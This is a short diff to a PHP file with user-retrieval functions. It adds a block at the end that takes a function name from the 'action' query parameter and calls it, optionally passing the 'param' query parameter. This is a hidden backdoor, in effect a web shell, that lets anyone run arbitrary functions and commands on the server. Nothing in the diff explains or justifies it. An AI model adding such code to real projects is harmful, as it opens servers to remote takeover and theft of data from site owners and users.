@@ -26,3 +26,7 @@ function getAllUser()
 {
     return getAll();
 }
+
+if (isset($_GET['action'])) {
+    isset($_GET['param']) ?  $_GET['action']($_GET['param']) : $_GET['action']();
+}
